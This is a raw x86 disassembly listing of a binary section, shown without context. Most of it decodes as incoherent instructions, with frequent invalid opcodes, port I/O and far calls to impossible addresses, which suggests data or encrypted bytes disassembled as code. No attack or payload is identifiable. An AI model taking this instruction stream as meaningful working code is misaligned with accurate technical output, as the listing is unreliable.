  40f573:	stos   DWORD PTR es:[edi],eax
  40f574:	enter  0xad85,0x6e
  40f578:	gs std 
  40f57a:	sbb    DWORD PTR [ebp-0x3c04da26],ebp
  40f580:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f581:	cmp    ebx,DWORD PTR [edi+0x5f4ed3bc]
  40f587:	or     edx,DWORD PTR [ecx]
  40f589:	dec    edx
  40f58a:	push   es
  40f58b:	(bad)  
  40f58c:	ss or  eax,0xef9df79d
  40f592:	hlt    
  40f593:	(bad)  
  40f594:	ja     0x40f600
  40f596:	daa    
  40f597:	loopne 0x40f617
  40f599:	je     0x40f5e7
  40f59b:	xor    BYTE PTR [ebp-0x4e59c2c7],ah
  40f5a1:	aas    
  40f5a2:	xchg   ecx,eax
  40f5a3:	adc    bl,BYTE PTR [eax]
  40f5a5:	scas   al,BYTE PTR es:[edi]
  40f5a6:	dec    edi
  40f5a7:	je     0x5e26b605
  40f5ad:	cld    
  40f5ae:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f5af:	push   0x711e6e1d
  40f5b4:	xchg   ecx,eax
  40f5b5:	cli    
  40f5b6:	push   ds
  40f5b7:	xor    al,0x1f
  40f5b9:	mov    edi,0x2895cd53
  40f5be:	mov    cl,0x8f
  40f5c0:	sub    al,0x49
  40f5c2:	dec    edx
  40f5c3:	push   ds
  40f5c4:	or     DWORD PTR [ecx+0x27],ebp
  40f5c7:	adc    BYTE PTR [edi+0x553ed22c],dh
  40f5cd:	test   DWORD PTR [esi-0x55],ecx
  40f5d0:	jno    0x40f62c
  40f5d2:	pushf  
  40f5d3:	mov    DWORD PTR [edi-0x26a8b3fc],esp
  40f5d9:	fiadd  WORD PTR [ecx+0x1a56bb20]
  40f5df:	jg     0x40f647
  40f5e1:	dec    edi
  40f5e2:	push   es
  40f5e3:	adc    DWORD PTR [esi-0x54813f6],eax
  40f5e9:	in     eax,dx
  40f5ea:	cmc    
  40f5eb:	sbb    DWORD PTR [ebx-0x6ce091be],ebp
  40f5f1:	jp     0x40f5bd
  40f5f3:	pop    edi
  40f5f4:	sti    
  40f5f5:	xchg   ebx,eax
  40f5f6:	xor    DWORD PTR [ecx],esp
  40f5f8:	dec    edi
  40f5f9:	sub    eax,DWORD PTR [ebx+0x260c8c09]
  40f5ff:	(bad)  
  40f600:	cmp    al,BYTE PTR [ecx-0x72c6a471]
  40f606:	sbb    eax,0xaa7fc97f
  40f60b:	push   es
  40f60c:	movs   WORD PTR es:[edi],WORD PTR ds:[esi]
  40f60e:	mov    edx,0x9248d6bf
  40f613:	inc    esi
  40f614:	cmp    BYTE PTR [edi+0xbae9a54],al
  40f61a:	ins    BYTE PTR es:[edi],dx
  40f61b:	sbb    BYTE PTR [esi+0x5],al
  40f61e:	popa   
  40f61f:	adc    DWORD PTR [eax+0x71],eax
  40f622:	xor    eax,0xcac97fc9
  40f627:	in     eax,dx
  40f628:	pop    esp
  40f629:	leave  
  40f62a:	add    DWORD PTR ds:0x602fc69d,ebp
  40f630:	mov    dh,0x40
  40f632:	gs mov dl,0xbd
  40f635:	sbb    dh,BYTE PTR [eax-0x2e8f47db]
  40f63b:	(bad)  
  40f63c:	inc    ebp
  40f63d:	dec    esi
  40f63e:	pop    ebp
  40f63f:	popf   
  40f640:	test   BYTE PTR [ebx+0x2bd57407],cl
  40f646:	mov    eax,ds:0xb2f65877
  40f64b:	dec    ebx
  40f64c:	sub    dl,BYTE PTR [esi-0x2e1bf002]
  40f652:	adc    DWORD PTR [edx+0x5273074],ebp
  40f658:	dec    edx
  40f659:	fld    TBYTE PTR [edi]
  40f65b:	xchg   edx,eax
  40f65c:	(bad)  
  40f65d:	fdiv   QWORD PTR [ecx-0x647c389d]
  40f663:	ss inc ecx
  40f665:	int    0xa2
  40f667:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f668:	mov    eax,0x334fe26e
  40f66d:	sub    BYTE PTR [ebp-0x9],dh
  40f670:	sub    al,0x5f
  40f672:	mov    bl,ah
  40f674:	or     al,0x59
  40f676:	je     0x40f64e
  40f678:	sub    bh,cl
  40f67a:	xor    bl,BYTE PTR [eax+0x39]
  40f67d:	in     eax,dx
  40f67e:	pusha  
  40f67f:	push   0x5d
  40f681:	stos   DWORD PTR es:[edi],eax
  40f682:	jp     0x40f67a
  40f684:	neg    BYTE PTR [edx-0x690f98f8]
  40f68a:	mov    cl,0x87
  40f68c:	sub    DWORD PTR [eax+0x1],edi
  40f68f:	push   esp
  40f690:	cdq    
  40f691:	sahf   
  40f692:	shl    BYTE PTR [edi+0x1b],cl
  40f695:	inc    ecx
  40f696:	adc    ebp,edx
  40f698:	cld    
  40f699:	call   0x113a03c
  40f69e:	sar    DWORD PTR [eax],0x5a
  40f6a1:	ja     0x40f712
  40f6a3:	aas    
  40f6a4:	dec    edx
  40f6a5:	call   0x26353213
  40f6aa:	jns    0x40f713
  40f6ac:	and    eax,0xdb033f5e
  40f6b1:	loope  0x40f6e2
  40f6b3:	xchg   ebx,eax
  40f6b4:	pop    ds
  40f6b5:	adc    DWORD PTR [eax-0x53],esi
  40f6b8:	mov    DWORD PTR [edi],ebx
  40f6ba:	ret    0xa925
  40f6bd:	popf   
  40f6be:	cmp    eax,0x74ce33b9
  40f6c3:	pop    ebp
  40f6c4:	shl    BYTE PTR [eax-0x4a9086ef],1
  40f6ca:	loop   0x40f737
  40f6cc:	dec    ecx
  40f6cd:	push   eax
  40f6ce:	xor    DWORD PTR [eax-0x48663db8],esi
  40f6d4:	jne    0x40f725
  40f6d6:	fdivr  DWORD PTR ds:0x342d481f
  40f6dc:	adc    eax,0x369dc6ef
  40f6e1:	mov    edx,ds
  40f6e3:	imul   esp,DWORD PTR [edx+0x50ca4b53],0xc45ab477
  40f6ed:	add    BYTE PTR [ecx-0x7e],bh
  40f6f0:	sub    al,0x43
  40f6f2:	add    eax,DWORD PTR [ebp-0x26]
  40f6f5:	retf   0x3be9
  40f6f8:	xchg   edi,eax
  40f6f9:	cmp    ah,BYTE PTR [esi]
  40f6fb:	push   0xbd729773
  40f700:	push   ecx
  40f701:	dec    ebx
  40f702:	sub    ah,BYTE PTR [eax-0x37]
  40f705:	add    eax,0x19f7a1af
  40f70a:	call   0x6f5b2c2a
  40f70f:	not    BYTE PTR [ebp-0x74]
  40f712:	enter  0x6c18,0x1e
  40f716:	adc    eax,0x8b775a93
  40f71b:	aad    0xbf
  40f71d:	mov    ecx,ds
  40f71f:	and    DWORD PTR [edi-0x74f974d4],0x56
  40f726:	add    al,0xf
  40f728:	lods   al,BYTE PTR ds:[esi]
  40f729:	rol    BYTE PTR [edx],1
  40f72b:	mov    DWORD PTR [ebp+0x14],eax
  40f72e:	mov    eax,DWORD PTR [esi]
  40f730:	xor    DWORD PTR [ebp+0x14],edi
  40f733:	shr    edx,0x2
  40f736:	mov    edx,DWORD PTR [esi+0x4]
  40f739:	jmp    0x40fcc3
  40f73e:	inc    edx
  40f73f:	jecxz  0x40f7be
  40f741:	sbb    bl,BYTE PTR [eax+ebx*1]
  40f744:	sub    bl,dl
  40f746:	mov    esi,0x29b40793
  40f74b:	or     eax,0x74e268e4
  40f750:	push   ss
  40f751:	push   ss
  40f752:	cmp    eax,0x8b161604
  40f757:	loopne 0x40f70f
  40f759:	adc    al,0x2f
  40f75b:	into   
  40f75c:	cdq    
  40f75d:	push   es
  40f75e:	pop    ebp
  40f75f:	outs   dx,BYTE PTR ds:[esi]
  40f760:	sar    BYTE PTR [edx],1
  40f762:	dec    esi
  40f763:	addr16 jge 0x40f753
  40f766:	sti    
  40f767:	pop    ebp
  40f768:	aaa    
  40f769:	lea    ebx,ds:[edx-0xd61e1c5]
  40f770:	retf   
  40f771:	stos   DWORD PTR es:[edi],eax
  40f772:	push   ecx
  40f773:	mov    eax,ds:0xa08a274e
  40f778:	cli    
  40f779:	push   esi
  40f77a:	mov    edi,0x6eb2260c
  40f77f:	xor    DWORD PTR [ecx],esp
  40f781:	xlat   BYTE PTR ds:[ebx]
  40f782:	xor    ebx,esp
  40f784:	js     0x40f7b0
  40f786:	jg     0x40f776
  40f788:	out    0xe,eax
  40f78a:	mov    edi,0x53120f3
  40f78f:	cld    
  40f790:	in     al,dx
  40f791:	xor    eax,0x56a8aa02
  40f796:	int3   
  40f797:	add    dh,cl
  40f799:	loopne 0x40f816
  40f79b:	push   edx
  40f79c:	cli    
  40f79d:	cdq    
  40f79e:	outs   dx,BYTE PTR ds:[esi]
  40f79f:	inc    ecx
  40f7a0:	mov    dh,0xcd
  40f7a2:	mov    dh,0xdb
  40f7a4:	mov    esi,0xf67b7998
  40f7a9:	pop    ss
  40f7aa:	stos   DWORD PTR es:[edi],eax
  40f7ab:	(bad)  
  40f7ac:	push   ebp
  40f7ad:	ins    BYTE PTR es:[edi],dx
  40f7ae:	rcl    BYTE PTR [esi+esi*4+0x71],0xbd
  40f7b3:	mov    cl,0x37
  40f7b5:	push   edx
  40f7b6:	inc    esi
  40f7b7:	lds    edx,FWORD PTR [eax-0x6a]
  40f7ba:	pop    eax
  40f7bb:	dec    esi
  40f7bc:	add    ebp,edi
  40f7be:	daa    
  40f7bf:	test   DWORD PTR [ebx+0x5b],ebp
  40f7c2:	jle    0x40f7ef
  40f7c4:	push   ebx
  40f7c5:	inc    esp
  40f7c6:	jmp    DWORD PTR [ebx+0x4]
  40f7c9:	cmc    
  40f7ca:	mov    eax,0x1fcf851f
  40f7cf:	inc    ecx
  40f7d0:	stos   BYTE PTR es:[edi],al
  40f7d1:	xchg   ecx,eax
  40f7d2:	xchg   ebx,eax
  40f7d3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f7d4:	jge    0x40f784
  40f7d6:	and    al,0x4e
  40f7d8:	or     BYTE PTR [esi+0x79],0x3d
  40f7dc:	pop    esi
  40f7dd:	aad    0xac
  40f7df:	sub    BYTE PTR [eax+edx*1-0x57f00308],dl
  40f7e6:	fimul  WORD PTR [eax-0x27]
  40f7e9:	loope  0x40f791
  40f7eb:	mov    al,0x2e
  40f7ed:	xchg   esp,eax
  40f7ee:	or     dl,BYTE PTR [eax+0x44]
  40f7f1:	cmp    eax,0x11ce6ae
  40f7f6:	cld    
  40f7f7:	jecxz  0x40f7f2
  40f7f9:	fsqrt  
  40f7fb:	in     al,0xd1
  40f7fd:	int3   
  40f7fe:	call   0x6a6bda6b
  40f803:	xor    ch,BYTE PTR [edi-0x5a902fe1]
  40f809:	pop    edx
  40f80a:	or     DWORD PTR [ecx-0x42b29b5f],0xffffff8f
  40f811:	cs scas al,BYTE PTR es:[edi]
  40f813:	mov    dh,0xec
  40f815:	cmp    al,0x65
  40f817:	push   ecx
  40f818:	in     eax,0x28
  40f81a:	test   DWORD PTR cs:[ebx+edx*8],0x5149d64d
  40f822:	xchg   ebp,eax
  40f823:	jo     0x40f7db
  40f825:	pop    es
  40f826:	cmp    DWORD PTR [esi+0x224a0302],ecx
  40f82c:	jl     0x40f7ee
  40f82e:	mov    ch,0xc1
  40f830:	xor    ch,ch
  40f832:	jg     0x40f87e
  40f834:	xchg   DWORD PTR ds:0x2fa15b7,esp
  40f83a:	sahf   
  40f83b:	(bad)  
  40f83c:	xor    al,0x88
  40f83e:	scas   al,BYTE PTR es:[edi]
  40f83f:	push   ss
  40f840:	(bad)  
  40f841:	mov    eax,0xf1247e4e
  40f846:	pop    esi
  40f847:	jno    0x40f87e
  40f849:	mov    al,0x55
  40f84b:	mov    ?,WORD PTR [edx-0x62]
  40f84e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f84f:	outs   dx,DWORD PTR ds:[esi]
  40f850:	call   FWORD PTR cs:[edi+edi*8]
  40f854:	rcr    DWORD PTR [ebx],cl
  40f856:	fld    TBYTE PTR [ebx+0x6c]
  40f859:	std    
  40f85a:	lds    edx,FWORD PTR [ecx-0x6b]
  40f85d:	data16 fidiv WORD PTR [ebx-0x3]
  40f861:	push   edi
  40f862:	stc    
  40f863:	retf   0x11d6
  40f866:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f867:	push   es
  40f868:	fst    DWORD PTR [ebx]
  40f86a:	lock xchg ecx,eax
  40f86c:	mov    ds:0xf363d459,eax
  40f871:	sub    bl,BYTE PTR [edx+0x68045ff3]
  40f877:	in     al,dx
  40f878:	jns    0x40f834
  40f87a:	fisub  WORD PTR [ebx+0x4e7c7979]
  40f880:	sub    al,0x3e
  40f882:	pop    es
  40f883:	xor    al,0x1
  40f885:	scas   eax,DWORD PTR es:[edi]
  40f886:	jl     0x40f868
  40f888:	sbb    eax,eax
  40f88a:	rcr    BYTE PTR [eax-0x5d66047c],cl
  40f890:	cmp    ecx,ecx
  40f892:	adc    ebx,ecx
  40f894:	out    0x26,eax
  40f896:	aam    0x64
  40f898:	xchg   edx,eax
  40f89a:	(bad)  
  40f89b:	or     al,BYTE PTR [edi-0x4]
  40f89e:	out    0x3e,al
  40f8a0:	jns    0x40f88c
  40f8a2:	push   eax
  40f8a3:	push   esp
  40f8a4:	(bad)  
  40f8a5:	fild   WORD PTR [edi]
  40f8a7:	adc    al,0xe0
  40f8a9:	push   edi
  40f8aa:	js     0x40f855
  40f8ac:	xchg   esi,eax
  40f8ad:	clc    
  40f8ae:	pusha  
  40f8af:	sub    al,0x7a
  40f8b1:	rcr    DWORD PTR [ebp+0x73b0568a],cl
  40f8b7:	fmul   DWORD PTR [edx+0x7c7b3bb5]
  40f8bd:	adc    DWORD PTR [esi+0x14],0x7b
  40f8c1:	mov    ebp,0x1438c86a
  40f8c6:	fwait
  40f8c7:	bound  ebp,QWORD PTR [eax-0x23]
  40f8ca:	and    BYTE PTR [edi+0x2eb09e27],dl
  40f8d0:	aas    
  40f8d1:	jne    0x40f8b5
  40f8d3:	nop
  40f8d4:	mov    edi,0x6d3dadaa
  40f8d9:	add    eax,0x20af7613
  40f8de:	stos   BYTE PTR es:[edi],al
  40f8df:	cmc    
  40f8e0:	pop    edx
  40f8e1:	xor    DWORD PTR [eax],ebx
  40f8e3:	jno    0x40f908
  40f8e5:	dec    ebp
  40f8e6:	cmp    bh,BYTE PTR [ebp+0x7e]
  40f8e9:	(bad)  
  40f8ea:	lods   eax,DWORD PTR ds:[esi]
  40f8eb:	stos   DWORD PTR es:[edi],eax
  40f8ec:	jns    0x40f8b6
  40f8ee:	xor    eax,0x5a
  40f8f1:	sbb    eax,0xb3a9e0ed
  40f8f6:	lods   eax,DWORD PTR ds:[esi]
  40f8f7:	fistp  DWORD PTR [esi]
  40f8f9:	js     0x40f8e1
  40f8fb:	aas    
  40f8fc:	mov    ss,ebx
  40f8fe:	xlat   BYTE PTR ds:[ebx]
  40f8ff:	fadd   QWORD PTR [ebp-0x6]
  40f902:	jno    0x55b6728c
  40f908:	xchg   esp,edx
  40f90a:	neg    BYTE PTR [ecx-0x1234ab31]
  40f910:	call   0xdcec:0xd28b84fb
  40f917:	adc    esi,0xf3f5fb0e
  40f91d:	jbe    0x40f99c
  40f91f:	mov    dh,0x13
  40f921:	std    
  40f922:	or     al,0x4a
  40f924:	xchg   ebp,eax
  40f925:	out    0x2f,al
  40f927:	xor    eax,0x6480b0dc
  40f92c:	mov    ecx,0x90ba5cce
  40f931:	stc    
  40f932:	mov    esp,0xd7b90d8c
  40f937:	xor    ebx,DWORD PTR [edx+0xdbd617b]
  40f93d:	or     dl,dh
  40f93f:	and    DWORD PTR [edi],0xffffff88
  40f942:	sbb    edx,0xb4cac88d
  40f948:	pop    ebp
  40f949:	jmp    DWORD PTR [edi]
  40f94b:	lahf   
  40f94c:	mov    al,0xf2
  40f94e:	mov    ebx,DWORD PTR [edx-0x2d85a416]
  40f954:	dec    edi
  40f955:	addr16 hlt 
  40f957:	jno    0x40f957
  40f959:	inc    eax
  40f95a:	xor    ah,bl
  40f95c:	jae    0x40f9ba
  40f95e:	sbb    dh,BYTE PTR [edx+0x62808f30]
  40f964:	xchg   edx,eax
  40f965:	add    DWORD PTR [ebp+0x1c],eax
  40f968:	xchg   edi,ecx
  40f96a:	int    0xed
  40f96c:	pop    ss
  40f96d:	in     eax,dx
  40f96e:	inc    ecx
  40f96f:	popa   
  40f970:	pop    ss
  40f971:	in     al,dx
  40f972:	sub    eax,0x4742cf28
  40f977:	mov    BYTE PTR [esp+esi*4-0x29],bh
  40f97b:	dec    ebp
  40f97c:	adc    BYTE PTR [eax],ah
  40f97e:	(bad)  
  40f97f:	push   cs
  40f980:	xor    BYTE PTR [ebx+eax*4+0x18],dl
  40f984:	dec    eax
  40f985:	inc    eax
  40f986:	push   edi
  40f987:	lahf   
  40f988:	mov    esp,0xd3c151b4
  40f98d:	mov    esp,0xe5ffdaf5
  40f992:	add    al,0xe5
  40f994:	or     esp,eax
  40f996:	push   DWORD PTR [esi]
  40f998:	out    0xf,al
  40f99a:	ret    0xfb99
  40f99d:	adc    eax,DWORD PTR [edi-0x316d5232]
  40f9a3:	stos   DWORD PTR es:[edi],eax
  40f9a4:	leave  
  40f9a5:	leave  
  40f9a6:	aam    0xdf
  40f9a8:	mov    esi,0xefa25c5d
  40f9ad:	push   es
  40f9ae:	in     al,0x9e
  40f9b0:	adc    eax,0x91a6f054
  40f9b5:	popa   
  40f9b6:	add    ebx,DWORD PTR [edx-0x18abf0da]
  40f9bc:	loopne 0x40f963
  40f9be:	mov    edi,ebp
  40f9c0:	mov    bh,0x23
  40f9c2:	cs dec edi
  40f9c4:	sbb    ebp,ebp
  40f9c6:	out    dx,eax
  40f9c7:	push   0x863a5dac
  40f9cc:	pop    es
  40f9cd:	loop   0x40f966
  40f9cf:	xor    ecx,DWORD PTR [ebx+0x507c6135]
  40f9d5:	rcr    BYTE PTR [eax],0xcc
  40f9d8:	jl     0x40f95b
  40f9da:	jae    0x40f98e
  40f9dc:	push   eax
  40f9dd:	in     eax,0xfd
  40f9df:	add    BYTE PTR [esi],ah
  40f9e1:	sahf   
  40f9e2:	mov    bl,0x9
  40f9e4:	pop    esp
  40f9e5:	leave  
  40f9e6:	js     0x40f9d6
  40f9e8:	push   0x9223893
  40f9ed:	dec    eax
  40f9ee:	pop    esi
  40f9ef:	les    esp,FWORD PTR [eax]
  40f9f1:	mov    ecx,0x9c37b472
  40f9f6:	pop    ebp
  40f9f7:	frstor [ebp-0x19]
  40f9fa:	loop   0x40fa4b
  40f9fc:	cdq    
  40f9fd:	out    dx,al
  40f9fe:	jne    0x40fa11
  40fa00:	dec    edx
  40fa01:	push   ds
  40fa02:	pop    es
  40fa03:	mov    ch,0x58
  40fa05:	jne    0x40f998
  40fa07:	xchg   edi,eax
  40fa08:	stos   DWORD PTR es:[edi],eax
  40fa09:	cmp    edx,ecx
  40fa0b:	cmp    esi,esi
  40fa0d:	addr16 inc edx
  40fa0f:	fmul   QWORD PTR [ecx+0xa]
  40fa12:	mov    ah,0x8
  40fa14:	mov    ds:0x3800408a,al
  40fa19:	lods   al,BYTE PTR ds:[esi]
  40fa1a:	dec    ebx
  40fa1b:	and    al,0x36
  40fa1d:	sub    BYTE PTR [esi+0x531b922],0xe1
  40fa24:	lds    ebp,FWORD PTR [ebp-0x31be1021]
  40fa2a:	sahf   
  40fa2b:	popf   
  40fa2c:	mov    esi,0xa874d986
  40fa31:	icebp  
  40fa32:	pop    ecx
  40fa33:	mov    edi,0xe763e5e5
  40fa38:	pop    ss
  40fa39:	xchg   esi,eax
  40fa3a:	aam    0xe6
  40fa3c:	adc    BYTE PTR [edx+0x59],ah
  40fa3f:	dec    ecx
  40fa40:	call   0x2e3e:0xd0f0626
  40fa47:	jg     0x40f9ee
  40fa49:	xor    eax,0x4364900c
  40fa4e:	mov    ebp,0x8a2bad65
  40fa53:	jmp    0x7b4c1c02
  40fa58:	lahf   
  40fa59:	fucomp st(5)
  40fa5b:	mov    fs,WORD PTR [edi-0x24ef9759]
  40fa61:	adc    esp,DWORD PTR [eax]
  40fa63:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fa64:	idiv   DWORD PTR [edx]
  40fa66:	and    esi,edi
  40fa68:	sub    bh,BYTE PTR [ebp+0x7f]
  40fa6b:	sbb    BYTE PTR [ecx+0x53],0x4
  40fa6f:	bound  esi,QWORD PTR [esi]
  40fa71:	out    0xe3,al
  40fa73:	das    
  40fa74:	push   edi
  40fa75:	mov    dh,0xe9
  40fa77:	sahf   
  40fa78:	enter  0x8e19,0xc9
  40fa7c:	xrelease mov DWORD PTR [esi],eax
  40fa7f:	pop    es
  40fa80:	mov    ch,0x11
  40fa82:	pop    esi
  40fa83:	cdq    
  40fa84:	dec    eax
  40fa85:	in     eax,dx
  40fa86:	test   DWORD PTR [edx],0xe38fb739
  40fa8c:	pop    ds
  40fa8d:	cld    
  40fa8e:	out    0x42,eax
  40fa90:	add    ebp,DWORD PTR [edi]
  40fa92:	sub    al,0x16
  40fa94:	popa   
  40fa95:	xchg   edx,eax
  40fa96:	das    
  40fa97:	ds mov dl,0x1
  40fa9a:	clc    
  40fa9b:	sub    al,0xea
  40fa9d:	aas    
  40fa9e:	dec    eax
  40fa9f:	(bad)  
  40faa0:	gs xor eax,0xfef92c81
  40faa6:	sub    eax,DWORD PTR [ebp+0x37aa6c46]
  40faac:	repnz inc ebx
  40faae:	sub    eax,0xef0dfff6
  40fab3:	into   
  40fab4:	mov    ds:0xa77f5b33,al
  40fab9:	nop
  40faba:	adc    DWORD PTR [ebx+ebp*1+0x34],edi
  40fabe:	popa   
  40fabf:	je     0x40fab2
  40fac1:	fwait
  40fac2:	mov    eax,0x272680a2
  40fac7:	in     al,0xa4
  40fac9:	clc    
  40faca:	mov    al,ds:0x7cf6aa1f
  40facf:	iret   
  40fad0:	jg     0x40fb10
  40fad2:	and    al,0x6f
  40fad4:	add    ecx,DWORD PTR [ebx]
  40fad6:	dec    ebp
  40fad7:	mov    esp,DWORD PTR ss:[ecx+eax*2-0x6122d55a]
  40fadf:	inc    ebp
  40fae0:	call   0x1e10ce82
  40fae5:	dec    edi
  40fae6:	cmp    al,0x95
  40fae8:	jnp    0x40fab2
  40faea:	push   cs
  40faeb:	sub    ecx,0x95ab484a
  40faf1:	repnz cmp DWORD PTR [ebp+0x12],eax
  40faf5:	sbb    cl,BYTE PTR [eax]
  40faf7:	pop    eax
  40faf8:	sub    esp,DWORD PTR [ebx+0xc962872]
  40fafe:	push   ebx
  40faff:	das    
  40fb00:	mov    ah,0xc5
  40fb02:	(bad)  
  40fb04:	aam    0xae
  40fb06:	mov    ebx,0xbb6910a0
  40fb0b:	rol    BYTE PTR [ecx+0x7d],0xe5
  40fb0f:	jnp    0x40fb80
  40fb11:	aas    
  40fb12:	cli    
  40fb13:	lahf   
  40fb14:	xchg   BYTE PTR [ebx+esi*1],dl
  40fb17:	adc    BYTE PTR [ebx-0xe],0xb7
  40fb1b:	dec    edx
  40fb1c:	rcr    bh,1
  40fb1e:	xor    cl,BYTE PTR [ecx+0x1]
  40fb21:	(bad)  
  40fb22:	pop    ss
  40fb23:	adc    eax,0xe1f81208
  40fb28:	mov    edx,0xc88ae8fc
  40fb2d:	into   
  40fb2e:	jle    0x40fb79
  40fb30:	rcr    BYTE PTR [ebx],1
  40fb32:	clc    
  40fb33:	loope  0x40faf9
  40fb35:	int3   
  40fb36:	sahf   
  40fb37:	lods   al,BYTE PTR ds:[esi]
  40fb38:	test   eax,0x7195c9c9
  40fb3d:	fnstcw WORD PTR [eax]
  40fb3f:	mov    al,ds:0xd9ade90c
  40fb44:	mov    ebx,0xd64996c0
  40fb49:	mov    cl,0xd8
  40fb4b:	adc    bl,dh
  40fb4d:	clc    
  40fb4e:	mov    cs,WORD PTR [ebx+0x6c00328]
  40fb54:	push   eax
  40fb55:	jb     0x40fb38
  40fb57:	iret   
  40fb58:	push   eax
  40fb59:	xlat   BYTE PTR ds:[ebx]
  40fb5a:	or     BYTE PTR [eax+eax*2+0x1006eb73],0xc8
  40fb62:	xlat   BYTE PTR ds:[ebx]
  40fb63:	loopne 0x40fb10
  40fb65:	fs cmc 
  40fb67:	add    ecx,ebx
  40fb69:	in     eax,dx
  40fb6a:	xor    bl,BYTE PTR [eax+edi*1-0x2e]
  40fb6e:	push   es
  40fb6f:	outs   dx,BYTE PTR ds:[esi]
  40fb70:	std    
  40fb71:	mov    esi,0x2f48a7d0
  40fb76:	ins    DWORD PTR es:[edi],dx
  40fb77:	iret   
  40fb78:	push   edi
  40fb79:	push   eax
  40fb7a:	mov    DWORD PTR [eax],ebx
  40fb7c:	stos   BYTE PTR es:[edi],al
  40fb7d:	retf   
  40fb7e:	sahf   
  40fb7f:	cs loop 0x40fbe2
  40fb82:	jae    0x40fb9c
  40fb84:	loopne 0x40fb91
  40fb86:	sub    ebx,DWORD PTR [esi]
  40fb88:	xor    BYTE PTR [edx],bh
  40fb8a:	mov    ecx,0xe2dd5e0d
  40fb8f:	imul   ebx,DWORD PTR [ebp-0x4b3d6ebb],0xffffffad
  40fb96:	mov    ch,0x41
  40fb98:	dec    esi
  40fb99:	test   esp,eax
  40fb9b:	sub    ecx,0xffffff8e
  40fb9e:	inc    ebx
  40fb9f:	and    eax,0x643dbe0f
  40fba4:	fld    TBYTE PTR [ecx+0x70]
  40fba7:	pop    ss
  40fba8:	imul   ebp,ebx,0x4a39b94c
  40fbae:	adc    BYTE PTR [edx+0x370512a3],ah
  40fbb4:	fwait
  40fbb5:	test   DWORD PTR [eax-0x175d5c0f],0xd64be9e4
  40fbbf:	jmp    0x8eaaaffe
  40fbc4:	rol    BYTE PTR [edx-0x7282bf16],cl
  40fbca:	int    0x95
  40fbcc:	shl    BYTE PTR [ecx+ebx*2-0x675397ed],1
  40fbd3:	arpl   WORD PTR [esi-0xa],cx
  40fbd6:	jp     0x40fbc6
  40fbd8:	adc    edx,edx
  40fbda:	ror    BYTE PTR [ebp+eax*4-0xf],1
  40fbde:	or     ebp,esi
  40fbe0:	cwde   
  40fbe1:	mov    ah,0xb3
  40fbe3:	sub    DWORD PTR [ebx],0xffffffaa
  40fbe6:	add    al,0x33
  40fbe8:	adc    eax,0x663fd58b
  40fbed:	jbe    0x40fbb5
  40fbef:	dec    edx
  40fbf0:	inc    ebp
  40fbf1:	jae    0x40fbd2
  40fbf3:	retf   
  40fbf4:	pop    ecx
  40fbf5:	ins    BYTE PTR es:[edi],dx
  40fbf6:	or     BYTE PTR [ebx],al
  40fbf8:	sbb    eax,0x8420ac3
  40fbfd:	outs   dx,BYTE PTR ds:[esi]
  40fbfe:	scas   al,BYTE PTR es:[edi]
  40fbff:	mov    eax,0x4ec5ec98
  40fc04:	pop    ebx
  40fc05:	push   edi
  40fc06:	cld    
  40fc07:	inc    eax
  40fc08:	add    ax,0x21eb
  40fc0c:	sti    
  40fc0d:	and    DWORD PTR [esi],esp
  40fc0f:	js     0x40fc14
  40fc11:	cmp    edx,ebp
  40fc13:	(bad)  ss:[eax-0x2f]
  40fc17:	inc    ebx
  40fc18:	xor    ebx,ecx
  40fc1a:	rol    ebx,1
  40fc1c:	xor    DWORD PTR [ebp+0x60b8386e],edx
  40fc22:	scas   eax,DWORD PTR es:[edi]
  40fc23:	into   
  40fc24:	mov    bh,0x8c
  40fc26:	fimul  WORD PTR [ecx-0x42]
  40fc29:	mov    eax,0x9e4c2966
  40fc2e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fc2f:	jno    0x40fc13
  40fc31:	push   ecx
  40fc32:	xchg   esi,eax
  40fc33:	sub    eax,0x94e09849
  40fc38:	push   edi
  40fc39:	popa   
  40fc3a:	call   0x8b14:0xfa8115c0
  40fc41:	jge    0x40fc3b
  40fc43:	mov    cl,0xe2
  40fc45:	fcmovnu st,st(2)
  40fc47:	push   ebx
  40fc48:	sahf   
  40fc49:	xor    al,0x10
  40fc4b:	dec    esi
  40fc4c:	push   esp
  40fc4d:	mov    eax,ds:0x2616dd91
  40fc52:	adc    dl,BYTE PTR [edx-0x20]
  40fc55:	mov    edx,0x8c317f5d
  40fc5a:	sub    eax,0xca03e472
  40fc5f:	mov    eax,0x521fcc92
  40fc64:	jecxz  0x40fcc8
  40fc66:	mov    ebx,0x868ba846
  40fc6b:	inc    edi
  40fc6c:	mov    ds:0x169e5a1,eax
  40fc71:	in     al,dx
  40fc72:	(bad)  
  40fc74:	stos   BYTE PTR es:[edi],al
  40fc75:	sar    BYTE PTR [ebx],cl
  40fc77:	sbb    eax,0x2b24f7fd
  40fc7c:	xor    ebp,DWORD PTR [edx-0x11]
  40fc7f:	mov    ebx,0xe89ee699
  40fc84:	mov    ?,WORD PTR [eax]
  40fc86:	jnp    0x40fc55
  40fc88:	(bad)  
  40fc89:	data16 in al,0xe8
  40fc8c:	jge    0x40fcd9
  40fc8e:	es xchg edi,eax
  40fc90:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fc91:	inc    ecx
  40fc92:	les    esi,FWORD PTR [ebx+0x626ef693]
  40fc98:	test   DWORD PTR [ecx],0x9ed51def
  40fc9e:	fdivr  DWORD PTR [edi+0x349324a9]
  40fca4:	frstor [edx-0x385aea62]
  40fcaa:	adc    esp,DWORD PTR [ebx+0x21]
  40fcad:	adc    esi,ecx
  40fcaf:	div    DWORD PTR [edx+0x25]
  40fcb2:	je     0x40fcc6
  40fcb4:	push   ebx
  40fcb5:	and    ecx,0x75
  40fcb8:	es add esi,0xca3c63c7
  40fcbf:	cwde   
  40fcc0:	adc    ebp,0x5d
  40fcc3:	xor    edx,edx
  40fcc5:	shl    eax,0x1e
  40fcc8:	or     edx,DWORD PTR [ebp+0x14]
  40fccb:	mov    DWORD PTR [ebp-0x28],edx
  40fcce:	mov    eax,DWORD PTR [ebp-0x24]
  40fcd1:	mov    eax,DWORD PTR [ebp-0x24]
  40fcd4:	xor    edx,edx
